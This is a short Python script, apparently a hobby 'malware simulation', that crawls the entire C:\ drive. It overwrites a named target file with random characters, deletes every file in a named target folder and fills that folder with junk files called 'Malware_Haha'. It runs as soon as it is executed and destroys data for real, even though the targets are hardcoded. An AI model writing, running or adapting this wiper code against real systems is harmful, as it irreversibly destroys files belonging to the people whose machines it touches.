import os
import random
import string
import logging

logging.basicConfig(filename='malware_simulation.log', level=logging.INFO, format='%(asctime)s - %(message)s')

def garbage_maker(size=1024):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def replace_contents_file(file_path):
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' not found")
        logging.error(f"Failed to replace file: {file_path} - File not found")  
        return  
    
    with open(file_path, 'w') as file:
        file.write(garbage_maker())  
    logging.info(f"Replaced file content with garbage: {file_path}")


def replace_contents_folder(folder_path):
    if not os.path.exists(folder_path):
        print(f"Error: Folder '{folder_path}' not found")
        logging.error(f"Failed to replace folder: {folder_path} - Folder not found")  
        return  

    
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        if os.path.isfile(file_path):
            os.remove(file_path)  

    
    for i in range(10):
        file_path = os.path.join(folder_path, f"Malware_Haha_{i}.txt")
        with open(file_path, 'w') as file:
            file.write(garbage_maker())

    logging.info(f"Replaced folder contents with garbage files: {folder_path}")


def Execute_Malware(root_dir, target_file, target_folder):
    file_replaced = False
    folder_replaced = False

    for dirpath, dirnames, filenames in os.walk(root_dir):
       
        if not file_replaced:
            for filename in filenames:
                if filename == target_file:
                    replace_contents_file(os.path.join(dirpath, filename))
                    file_replaced = True
                    break
        
        if not folder_replaced:
            for dirname in dirnames:
                if dirname == target_folder:
                    replace_contents_folder(os.path.join(dirpath, dirname))
                    folder_replaced = True
                    break

        if file_replaced and folder_replaced:
            break

    
    if not file_replaced:
        logging.error(f"Target file '{target_file}' not found in the directory: {root_dir}")
    if not folder_replaced:
        logging.error(f"Target folder '{target_folder}' not found in the directory: {root_dir}")


root_directory = "C:\\"  


target_file = "Arham.txt"
target_folder = "Folder2"

Execute_Malware(root_directory, target_file, target_folder)
